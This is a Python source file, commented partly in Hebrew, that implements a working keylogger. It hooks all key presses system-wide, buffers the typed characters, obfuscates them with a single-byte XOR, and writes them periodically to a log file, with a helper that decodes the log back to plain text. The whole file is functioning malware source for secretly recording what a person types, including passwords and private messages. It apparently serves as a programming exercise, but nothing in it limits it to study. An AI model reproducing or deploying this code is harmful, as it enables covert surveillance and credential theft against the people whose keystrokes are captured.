
import time
import keyboard
import threading
import json
from abc import ABC, abstractmethod


# keylogger runtime
class KeyLoggerService:
    def __init__(self):
        self.buffer = []
        self.running = False
        self.lock = threading.Lock()

    def start_listening(self):
        self.running = True
        keyboard.on_press(self.record_key)

    def record_key(self, event):
        with self.lock:
            if event.name == "space":
                self.buffer.append(" ")  # רווח במקום "space"
            elif event.name == "enter":
                self.buffer.append("\n")  # שורה חדשה במקום "enter"
            elif len(event.name) == 1:  # מסנן מקשים מיוחדים כמו shift, ctrl
                self.buffer.append(event.name)

    def stop_listening(self):
        self.running = False
        keyboard.unhook_all()

    def get_buffer(self) -> str:
        """ מחזיר את הטקסט שנאסף כמחרוזת נקייה """
        with self.lock:
            data = "".join(self.buffer)  # מחבר את כל התווים למחרוזת אחת
            self.buffer.clear()
        return data


# Encryptor (XOR בלבד)
class Encryptor:
    def __init__(self, key=5):
        self.key = key

    def encrypt(self, data):
        """Encrypt by XOR בלבד"""
        return ''.join(chr(ord(char) ^ self.key) for char in data)

    def decrypt(self, encrypted_data):
        """Decrypt by XOR בלבד"""
        return ''.join(chr(ord(char) ^ self.key) for char in encrypted_data)


# Writer (Interface)
class Writer(ABC):
    @abstractmethod
    def write(self, data):
        pass


# Insert into file
class FileWriter(Writer):
    def __init__(self, filename="keylogger.txt"):
        self.filename = filename

    def write(self, data):
        with open(self.filename, "a", encoding="utf-8") as file:
            file.write(data + "\n")


# Manager
class KeyLoggerManager:
    def __init__(self, writers):
        self.key_logger_service = KeyLoggerService()
        self.encryptor = Encryptor()
        self.writers = writers
        self.running = False

    def run(self):
        """ מפעיל את המאזין ואת כתיבת הנתונים כל כמה שניות """
        self.running = True
        listener_thread = threading.Thread(target=self.key_logger_service.start_listening)
        writer_thread = threading.Thread(target=self.write_periodically, daemon=True)
        listener_thread.start()
        writer_thread.start()
        return listener_thread, writer_thread

    def stop(self):
        self.key_logger_service.stop_listening()
        self.running = False

    def write_periodically(self, interval=10):
        """ מבצע כתיבה כל X שניות """
        while self.running:
            time.sleep(interval)
            self.write_data()

    def write_data(self):
        """ מצפין את הנתונים וכותב אותם לקובץ """
        data = self.key_logger_service.get_buffer()
        if data:
            encrypted_data = self.encryptor.encrypt(data)
            for writer in self.writers:
                writer.write(encrypted_data)


def decrypt_and_save_to_file(input_filename="keylogger.txt", output_filename="decrypted_output.txt"):
    encryptor = Encryptor(key=5)

    with open(input_filename, "r", encoding="utf-8") as encrypted_file, \
            open(output_filename, "w", encoding="utf-8") as decrypted_file:
        for line in encrypted_file:
            decrypted_data = encryptor.decrypt(line.strip())  # פענוח הנתונים
            decrypted_file.write(decrypted_data + "\n")  # כתיבה לקובץ חדש


def main():
    file_writer = FileWriter()
    klm = KeyLoggerManager([file_writer])

    listener_thread, writer_thread = klm.run()

    time.sleep(10)
    klm.stop()

    listener_thread.join()
    writer_thread.join()

    # אחרי שה-keylogger מסיים, מפענחים את הנתונים ושומרים לקובץ נקי
    decrypt_and_save_to_file()
    print("\nDecryption completed! Check 'decrypted_output.txt'")


if __name__ == "__main__":
    main()
